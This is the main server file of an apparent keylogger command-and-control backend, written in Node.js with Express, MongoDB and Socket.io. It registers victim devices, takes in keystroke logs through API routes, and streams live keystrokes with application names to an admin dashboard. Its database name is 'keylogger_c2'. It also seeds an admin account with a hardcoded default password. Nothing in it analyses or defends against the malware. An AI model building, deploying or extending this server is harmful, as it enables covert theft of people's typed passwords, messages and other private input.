require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const { createServer } = require('http');
const { Server } = require('socket.io');
const Admin = require('./models/Admin');

const authRoutes = require('./routes/auth');
const deviceRoutes = require('./routes/devices');
const keystrokeRoutes = require('./routes/keystrokes');

const app = express();
const httpServer = createServer(app);

// Socket.io setup
const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// Middleware
app.set('trust proxy', 1); // Required for Render and other reverse proxies
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(morgan('dev'));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  message: { error: 'Too many requests.' }
});
app.use('/api/', limiter);

// Make io accessible to routes
app.set('io', io);

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/devices', deviceRoutes);
app.use('/api/keystrokes', keystrokeRoutes);

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log(`[Socket] Client connected: ${socket.id}`);

  socket.on('register-device', (data) => {
    socket.join(`device:${data.deviceId}`);
    console.log(`[Socket] Device registered: ${data.deviceId}`);
  });

  socket.on('keystroke-live', (data) => {
    // Broadcast keystroke to admin dashboard
    io.emit('live-keystroke', {
      deviceId: data.deviceId,
      keys: data.keys,
      application: data.application || 'Unknown',
      timestamp: new Date()
    });
  });

  socket.on('disconnect', () => {
    console.log(`[Socket] Client disconnected: ${socket.id}`);
  });
});

// Connect to MongoDB and start server
const PORT = process.env.PORT || 3000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/keylogger_c2';

async function startServer() {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log('[DB] Connected to MongoDB');

    // Seed admin
    const existingAdmin = await Admin.findOne({
      username: process.env.ADMIN_USERNAME || 'admin'
    });
    if (!existingAdmin) {
      const admin = new Admin({
        username: process.env.ADMIN_USERNAME || 'admin',
        password: process.env.ADMIN_PASSWORD || 'Admin@123456'
      });
      await admin.save();
      console.log('[Auth] Admin user created');
    }

    httpServer.listen(PORT, '0.0.0.0', () => {
      console.log(`[Server] Running on port ${PORT}`);
      console.log(`[Server] http://0.0.0.0:${PORT}`);
    });
  } catch (err) {
    console.error('[DB] Connection error:', err.message);
    process.exit(1);
  }
}

startServer();

